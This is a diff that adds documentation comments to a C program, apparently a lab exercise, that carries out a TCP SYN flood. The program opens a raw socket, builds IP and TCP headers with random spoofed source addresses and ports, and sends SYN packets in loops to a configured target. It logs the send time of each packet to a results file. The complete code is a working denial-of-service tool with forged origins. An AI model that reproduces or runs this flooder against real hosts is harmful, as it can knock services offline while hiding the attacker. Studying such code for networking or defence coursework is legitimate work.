@@ -12,6 +12,11 @@
 #include "Attack.h"
 
 
+/**
+ * @brief this function calculates the checksum field for Internet Protocol header
+ * @param ip pointer to IP header of the packet
+ * @return the checksum of the IP
+*/
 uint16_t calculate_ip_checksum(struct iphdr *ip)
 {
     uint32_t sum = 0;
@@ -33,6 +38,12 @@ uint16_t calculate_ip_checksum(struct iphdr *ip)
 }
 
 
+/**
+ * @brief this this function calculates the checksum field for Transmition Control Protocol header
+ * @param ip pointer to IP header of the packet
+ * @param tcp pointer to TCP header of the packet
+ * @return the checksum of the TCP
+*/
 uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
 {
     uint32_t sum = 0;
@@ -65,17 +76,28 @@ uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
 }
 
 
+/**
+ * @brief this function generates a random port number between 1024 and 65535 (include both)
+ * @return a radom port number
+*/
 int get_random_port()
 {
     return (int)(rand() % (65535 - 1024 + 1) + 1024);
 }
 
 
+/**
+ * @brief this function generates a random IPv4 address
+ * @param sockfd socket file descriptor
+ * @param file pointer to results file
+ * @note we need sockfd, file only to free them in case of calloc() fail
+ * @return a random IPv4 address
+*/
 char* get_random_ipv4(int sockfd, FILE *file)
 {
     char *ipv4 = NULL;
     ipv4 = (char*)calloc(16, sizeof(char));
-    if(!ipv4)
+    if(ipv4 == NULL)
     {
         perror("calloc() failed");
         close(sockfd);
@@ -88,6 +110,14 @@ char* get_random_ipv4(int sockfd, FILE *file)
 }
 
 
+/**
+ * @brief this function sets up the IP header
+ * @param targer pointer to address of the target machine
+ * @param ip pointer to IP header of the packet
+ * @param sockfd socket file descriptor
+ * @param file file pointer
+ * @note we need sockfd, file only to free them in case of calloc() fail
+ */
 void set_ip_layer(struct sockaddr_in *target, struct iphdr *ip, int sockfd, FILE *file)
 {
     ip->version = 4;
@@ -109,6 +139,12 @@ void set_ip_layer(struct sockaddr_in *target, struct iphdr *ip, int sockfd, FILE
 }
 
 
+/**
+ * @brief this function sets up the IP header
+ * @param targer pointer to address of the target machine
+ * @param ip pointer to IP header of the packet
+ * @param tcp pointer to TCP header of the packet
+*/
 void set_tcp_layer(struct sockaddr_in *target, struct iphdr *ip, struct tcphdr *tcp)
 {
     tcp->source = htons(get_random_port());
@@ -130,9 +166,9 @@ void set_tcp_layer(struct sockaddr_in *target, struct iphdr *ip, struct tcphdr *
 
 int main(int argc, char *argv[])
 {
-    srand(time(NULL));
+    srand(time(NULL)); // setting random seed
 
-    int sock = 0;
+    int sock = 0; // creating raw socket
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if(sock <= 0)
     {
@@ -140,7 +176,7 @@ int main(int argc, char *argv[])
         exit(errno);
     }   
 
-    int buffer_size = 1024 * 1024;
+    int buffer_size = 1024 * 1024; // increasing buffer size of send packets
     if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
     {
         perror("buffer-size setsockopt() failed");
@@ -148,7 +184,7 @@ int main(int argc, char *argv[])
         exit(errno);
     }
 
-    int optval = 1;
+    int optval = 1; // including IP header when sending packets
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
     {
         perror("IP setsockopt() failed");
@@ -156,7 +192,7 @@ int main(int argc, char *argv[])
         exit(errno);
     }
 
-    FILE *file = NULL;
+    FILE *file = NULL; // opening the results file for writing 
     file = fopen(RESULTS_FILE, "w");
     if(file == NULL)
     {
@@ -165,42 +201,42 @@ int main(int argc, char *argv[])
         exit(errno);
     }
 
-    struct sockaddr_in target_addr = {0};
+    struct sockaddr_in target_addr = {0}; // setting up the target's address and port
     memset(&target_addr, 0, sizeof(struct sockaddr_in));
     target_addr.sin_family = AF_INET;
     target_addr.sin_addr.s_addr = inet_addr(TARGET_IP_ADDR);
     target_addr.sin_port = htons(TARGET_PORT);
 
-    struct iphdr ip_header = {0};
+    struct iphdr ip_header = {0}; // creating IP header
     memset(&ip_header, 0, sizeof(struct iphdr));
 
-    struct tcphdr tcp_header = {0};
+    struct tcphdr tcp_header = {0}; // creating TCP header
     memset(&tcp_header, 0, sizeof(struct tcphdr));
 
-    char syn_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
+    char syn_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0}; // creating the TCP-SYN packet 
     memset(syn_packet, 0, sizeof(syn_packet));
 
-    int i = 0, j = 0;
+    int i = 0, j = 0; 
     size_t sent = 0;
 
     double avg = 0.0;
-    struct timeval start = {0}, end = {0};
+    struct timeval start = {0}, end = {0}; // creating structs for calculate timings
 
     for(i = 0; i < NUM_ITERATIONS; i++)
     {
         for(j = 0; j < NUM_PACKETS; j++)
         {
-            set_ip_layer(&target_addr, &ip_header, sock, file);
+            set_ip_layer(&target_addr, &ip_header, sock, file); // setting up the layers
             set_tcp_layer(&target_addr, &ip_header, &tcp_header);
 
-            memset(syn_packet, 0, sizeof(syn_packet));
+            memset(syn_packet, 0, sizeof(syn_packet)); // setting up the packet
             memcpy(syn_packet, &ip_header, sizeof(ip_header));
             memcpy(syn_packet + sizeof(ip_header), &tcp_header, sizeof(tcp_header));
 
-            memset(&start, 0, sizeof(struct timeval));
+            memset(&start, 0, sizeof(struct timeval)); // cleaning the timing structs
             memset(&end, 0, sizeof(struct timeval));
             
-            gettimeofday(&start, NULL);
+            gettimeofday(&start, NULL); // sending the packet and calculating times
             sent = sendto(sock, syn_packet, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
             gettimeofday(&end, NULL);
 
@@ -212,11 +248,11 @@ int main(int argc, char *argv[])
                 exit(errno);
             }
 
-            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
+            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0; // time in SECONDS
 
             fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0));
         
-            sleep(TIMEOUT);
+            sleep(TIMEOUT); //timeout between packets, maybe remove
         }
     }
 
